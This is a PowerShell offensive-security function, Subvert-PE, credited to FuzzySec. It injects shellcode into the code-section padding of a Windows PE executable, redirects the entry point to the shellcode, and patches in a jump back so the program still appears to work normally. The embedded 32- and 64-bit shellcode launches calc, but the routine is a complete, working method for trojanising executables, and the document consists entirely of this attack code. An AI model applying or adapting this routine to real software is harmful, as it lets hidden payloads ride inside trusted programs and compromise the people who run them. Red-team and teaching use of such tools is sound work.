function Subvert-PE {
<#
.SYNOPSIS

    Inject shellcode into a PE image while retaining the PE functionality.

    Author: Ruben Boonen (@FuzzySec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
	
.DESCRIPTION

    Parse a PE image, inject shellcode at the end of the code section and dynamically patch the entry point. After the shellcode executes, program execution is handed back over to the legitimate PE entry point.
	
.PARAMETER Path

    Path to portable executable.
	
.PARAMETER Write

    Inject shellcode and overwrite the PE. If omitted simply display "Entry Point", "Preferred Image Base" and dump the memory at the null-byte location.

.EXAMPLE

    C:\PS> Subvert-PE -Path C:\Path\To\PE.exe
	
.EXAMPLE

    C:\PS> Subvert-PE -Path C:\Path\To\PE.exe -Write

.LINK

	http://www.fuzzysecurity.com/
#>

	param (
        [Parameter(Mandatory = $True)]
		[string]$Path,
		[parameter(parametersetname="Write")]
		[switch]$Write
	)  

    # Read File bytes
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    
    New-Variable -Option Constant -Name Magic -Value @{
            "010b" =  "PE32"
            "020b" =  "PE32+"
    }
    
    # Function courtesy of @mattifestation
    function Local:ConvertTo-Int{
        Param(
            [Parameter(Position = 1, Mandatory = $True)]
            [Byte[]]
            $array)
        switch ($array.Length){
            # Convert to WORD & DWORD
            2 { Write-Output ( [UInt16] ('0x{0}' -f (($array | % {$_.ToString('X2')}) -join '')) ) }
            4 { Write-Output (  [Int32] ('0x{0}' -f (($array | % {$_.ToString('X2')}) -join '')) ) }
        }
    }
    
    # Offsets for calculations
    $PE = ConvertTo-Int $bytes[63..60]
    $NumOfPESection = ConvertTo-Int $bytes[($PE+7)..($PE+6)]
    $OptSize = ConvertTo-Int $bytes[($PE+21)..($PE+20)]
    $Opt = $PE + 24
    $SecTbl = $Opt + $OptSize
    
    # Entry point offset
    $EntryPointOffset = '{0:X8}' -f (ConvertTo-Int $bytes[($Opt+19)..($Opt+16)])
	# Duplicate for calculating JMP later
	$EntryPointBefore = ConvertTo-Int $bytes[($Opt+19)..($Opt+16)]
	echo "`nLegitimate Entry Point Offset:   0x$EntryPointOffset"
    
    # PE magic number
    $MagicVal = $Magic[('{0:X4}' -f (ConvertTo-Int $bytes[($Opt+1)..($Opt+0)]))]
    # Preferred ImageBase, based on $MagicVal --> PE32 (DWORD), PE32+ (QWORD)
    If($MagicVal -eq "PE32"){
        $ImageBase = '{0:X8}' -f (ConvertTo-Int $bytes[($Opt+31)..($Opt+28)])
		
    }
    ElseIf($MagicVal -eq "PE32+"){
        $QWORD = ( [UInt64] ('0x{0}' -f ((($bytes[($Opt+30)..($Opt+24)]) | % {$_.ToString('X2')}) -join '')) )
        $ImageBase = '{0:X16}' -f $QWORD
    }
    
    # Preferred Image Base
    echo "Preferred PE Image Base:         0x$ImageBase"
    
    # Grab "Virtual Size" and "Virtual Address" for the CODE section.
    $SecVirtualSize = ConvertTo-Int $bytes[($SecTbl+11)..($SecTbl+8)]
    $SecVirtualAddress = ConvertTo-Int $bytes[($SecTbl+15)..($SecTbl+12)]
    
    # Precise start of CODE null-byte section!
    $NullCount = '{0:X8}' -f ($SecVirtualSize + $SecVirtualAddress)
	
	# Offset in PE is different [$SecVirtualSize + $SecVirtualAddress - ($SecVirtualAddress - $SecPTRRawData)]
	$SecPTRRawData = ConvertTo-Int $bytes[($SecTbl+23)..($SecTbl+20)]
	$ShellCodeWrite = ($SecVirtualSize + $SecVirtualAddress - ($SecVirtualAddress - $SecPTRRawData))
	
	# Hexdump of null-byte padding (before)
	echo "`nNull-Byte Padding dump:"
	$output = ""
	foreach ( $count in $bytes[($ShellCodeWrite - 1)..($ShellCodeWrite+504)] ) {
		if (($output.length%32) -eq 0){
			$output += "`n"
		}
		else{
			$output += "{0:X2} " -f $count
		}
	} echo "$output`n"
	
    # If -Write flag is set
	if($Write){
    
        # Set shellcode variable based on PE architecture
        If($MagicVal -eq "PE32"){
            # 32-bit Universal WinExe (+ restore registers) --> calc (by SkyLined)
            # Size: 76 bytes
            $ShellCode = @(0x60,0x31,0xD2,0x52,0x68,0x63,0x61,0x6C,0x63,
            0x54,0x59,0x52,0x51,0x64,0x8B,0x72,0x30,0x8B,0x76,0x0C,0x8B,
            0x76,0x0C,0xAD,0x8B,0x30,0x8B,0x7E,0x18,0x8B,0x5F,0x3C,0x8B,
            0x5C,0x1F,0x78,0x8B,0x74,0x1F,0x20,0x01,0xFE,0x8B,0x54,0x1F,
            0x24,0x0F,0xB7,0x2C,0x17,0x42,0x42,0xAD,0x81,0x3C,0x07,0x57,
            0x69,0x6E,0x45,0x75,0xF0,0x8B,0x74,0x1F,0x1C,0x01,0xFE,0x03,
            0x3C,0xAE,0xFF,0xD7,0x58,0x58,0x61)
        }
        ElseIf($MagicVal -eq "PE32+"){
            # 64-bit Universal WinExe (+ restore registers) --> calc (by SkyLined)
            # Size: 97 bytes
            $ShellCode = @(0x53,0x56,0x57,0x55,0x6A,0x60,0x5A,0x68,0x63,
            0x61,0x6C,0x63,0x54,0x59,0x48,0x29,0xD4,0x65,0x48,0x8B,0x32,
            0x48,0x8B,0x76,0x18,0x48,0x8B,0x76,0x10,0x48,0xAD,0x48,0x8B,
            0x30,0x48,0x8B,0x7E,0x30,0x03,0x57,0x3C,0x8B,0x5C,0x17,0x28,
            0x8B,0x74,0x1F,0x20,0x48,0x01,0xFE,0x8B,0x54,0x1F,0x24,0x0F,
            0xB7,0x2C,0x17,0x8D,0x52,0x02,0xAD,0x81,0x3C,0x07,0x57,0x69,
            0x6E,0x45,0x75,0xEF,0x8B,0x74,0x1F,0x1C,0x48,0x01,0xFE,0x8B,
            0x34,0xAE,0x48,0x01,0xF7,0x99,0xFF,0xD7,0x48,0x83,0xC4,0x68,
            0x5D,0x5F,0x5E,0x5B)
        }
        
        # Inject all the things!
        for($i=0; $i -lt $ShellCode.Length; $i++){
            $bytes[($ShellCodeWrite + $i)] = $ShellCode[$i]
        }
        
        # Set new Entry Point Offset --> $NullCount
        $bytes[($Opt+19)] = [byte]('0x' + $NullCount.Substring(0,2))
        $bytes[($Opt+18)] = [byte]('0x' + $NullCount.Substring(2,2))
        $bytes[($Opt+17)] = [byte]('0x' + $NullCount.Substring(4,2))
        $bytes[($Opt+16)] = [byte]('0x' + $NullCount.Substring(6,2))
        
        # Modified Entry Point
        $EntryPointOffset = '{0:X8}' -f (ConvertTo-Int $bytes[($Opt+19)..($Opt+16)])
        echo "Modified Entry Point Offset:     0x$EntryPointOffset"
        
        # Calculate & append farJMP
        $Distance = '{0:x}' -f ($EntryPointBefore - (ConvertTo-Int $bytes[($Opt+19)..($Opt+16)]) - $ShellCode.Length - 5)
        echo "Inject Far JMP:                  0xe9$Distance"
        $bytes[($ShellCodeWrite + $ShellCode.Length)] = 0xE9
        $bytes[($ShellCodeWrite + $ShellCode.Length + 1)] = [byte]('0x' + $Distance.Substring(6,2))
        $bytes[($ShellCodeWrite + $ShellCode.Length + 2)] = [byte]('0x' + $Distance.Substring(4,2))
        $bytes[($ShellCodeWrite + $ShellCode.Length + 3)] = [byte]('0x' + $Distance.Substring(2,2))
        $bytes[($ShellCodeWrite + $ShellCode.Length + 4)] = [byte]('0x' + $Distance.Substring(0,2))
        
        # Hexdump of null-byte padding (after)
        echo "`nNull-Byte Padding After:"
        $output = ""
        foreach ( $count in $bytes[($ShellCodeWrite - 1)..($ShellCodeWrite+504)] ) {
            if (($output.length%32) -eq 0){
                $output += "`n"
            }
            else{
                $output += "{0:X2} " -f $count
            }
        } echo "$output`n"
    
        [System.IO.File]::WriteAllBytes($Path, $bytes)
    }
}